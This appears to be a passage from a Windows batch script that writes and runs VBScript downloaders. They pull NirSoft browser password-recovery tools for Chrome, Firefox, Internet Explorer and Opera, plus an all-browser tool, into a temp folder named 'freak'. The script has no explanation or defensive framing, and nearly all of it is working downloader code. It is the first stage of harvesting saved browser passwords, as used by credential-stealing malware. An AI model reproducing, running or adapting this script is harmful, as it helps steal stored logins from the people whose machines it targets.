
::Download Chrome::
echo strFileURL = "http://www.nirsoft.net/utils/chromepass.zip" >
%temp%\freak\chrome.vbs
echo strHDLocation = "%temp%\freak\chromepass.zip" >>
%temp%\freak\chrome.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>
%temp%\freak\chrome.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\chrome.vbs
echo objXMLHTTP.send() >> %temp%\freak\chrome.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\chrome.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >>
%temp%\freak\chrome.vbs
echo objADOStream.Open >> %temp%\freak\chrome.vbs
echo objADOStream.Type = 1 >> %temp%\freak\chrome.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\chrome.vbs
echo objADOStream.Position = 0 >> %temp%\freak\chrome.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >>
%temp%\freak\chrome.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile
strHDLocation >> %temp%\freak\chrome.vbs
echo Set objFSO = Nothing >> %temp%\freak\chrome.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\chrome.vbs
echo objADOStream.Close >> %temp%\freak\chrome.vbs
echo Set objADOStream = Nothing >> %temp%\freak\chrome.vbs
echo End if >> %temp%\freak\chrome.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\chrome.vbs
call %temp%\freak\chrome.vbs

::Download Firefox::
echo strFileURL = "http://www.nirsoft.net/utils/passwordfox.zip" >
%temp%\freak\fire.vbs
echo strHDLocation = "%temp%\freak\passwordfox.zip" >>
%temp%\freak\fire.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>
%temp%\freak\fire.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\fire.vbs
echo objXMLHTTP.send() >> %temp%\freak\fire.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\fire.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >>
%temp%\freak\fire.vbs
echo objADOStream.Open >> %temp%\freak\fire.vbs
echo objADOStream.Type = 1 >> %temp%\freak\fire.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\fire.vbs
echo objADOStream.Position = 0 >> %temp%\freak\fire.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >>
%temp%\freak\fire.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile
strHDLocation >> %temp%\freak\fire.vbs
echo Set objFSO = Nothing >> %temp%\freak\fire.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\fire.vbs
echo objADOStream.Close >> %temp%\freak\fire.vbs
echo Set objADOStream = Nothing >> %temp%\freak\fire.vbs
echo End if >> %temp%\freak\fire.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\fire.vbs
call %temp%\freak\fire.vbs

::Download IE::
echo strFileURL = "http://www.nirsoft.net/utils/iepv.zip" >
%temp%\freak\ie.vbs
echo strHDLocation = "%temp%\freak\iepv.zip" >> %temp%\freak\ie.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> %temp%\freak\ie.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\ie.vbs
echo objXMLHTTP.send() >> %temp%\freak\ie.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\ie.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> %temp%\freak\ie.vbs
echo objADOStream.Open >> %temp%\freak\ie.vbs
echo objADOStream.Type = 1 >> %temp%\freak\ie.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\ie.vbs
echo objADOStream.Position = 0 >> %temp%\freak\ie.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >>
%temp%\freak\ie.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile
strHDLocation >> %temp%\freak\ie.vbs
echo Set objFSO = Nothing >> %temp%\freak\ie.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\ie.vbs
echo objADOStream.Close >> %temp%\freak\ie.vbs
echo Set objADOStream = Nothing >> %temp%\freak\ie.vbs
echo End if >> %temp%\freak\ie.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\ie.vbs
call %temp%\freak\ie.vbs

::Download Opera::
echo strFileURL = "http://www.nirsoft.net/utils/operapassview.zip" >
%temp%\freak\opera.vbs
echo strHDLocation = "%temp%\freak\operapassview.zip" >>
%temp%\freak\opera.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>
%temp%\freak\opera.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\opera.vbs
echo objXMLHTTP.send() >> %temp%\freak\opera.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\opera.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >>
%temp%\freak\opera.vbs
echo objADOStream.Open >> %temp%\freak\opera.vbs
echo objADOStream.Type = 1 >> %temp%\freak\opera.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\opera.vbs
echo objADOStream.Position = 0 >> %temp%\freak\opera.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >>
%temp%\freak\opera.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile
strHDLocation >> %temp%\freak\opera.vbs
echo Set objFSO = Nothing >> %temp%\freak\opera.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\opera.vbs
echo objADOStream.Close >> %temp%\freak\opera.vbs
echo Set objADOStream = Nothing >> %temp%\freak\opera.vbs
echo End if >> %temp%\freak\opera.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\opera.vbs
call %temp%\freak\opera.vbs

::Download All:
echo strFileURL = "http://nirsoft.net/utils/webbrowserpassview.zip" >
%temp%\freak\all.vbs
echo strHDLocation = "%temp%\freak\webbrowserpassview.zip" >>
%temp%\freak\all.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>
%temp%\freak\all.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> %temp%\freak\all.vbs
echo objXMLHTTP.send() >> %temp%\freak\all.vbs
echo If objXMLHTTP.Status = 200 Then >> %temp%\freak\all.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >>
%temp%\freak\all.vbs
echo objADOStream.Open >> %temp%\freak\all.vbs
echo objADOStream.Type = 1 >> %temp%\freak\all.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\freak\all.vbs
echo objADOStream.Position = 0 >> %temp%\freak\all.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >>
%temp%\freak\all.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile
strHDLocation >> %temp%\freak\all.vbs
echo Set objFSO = Nothing >> %temp%\freak\all.vbs
echo objADOStream.SaveToFile strHDLocation >> %temp%\freak\all.vbs
echo objADOStream.Close >> %temp%\freak\all.vbs
echo Set objADOStream = Nothing >> %temp%\freak\all.vbs
echo End if >> %temp%\freak\all.vbs
echo Set objXMLHTTP = Nothing >> %temp%\freak\all.vbs
call %temp%\freak\all.vbs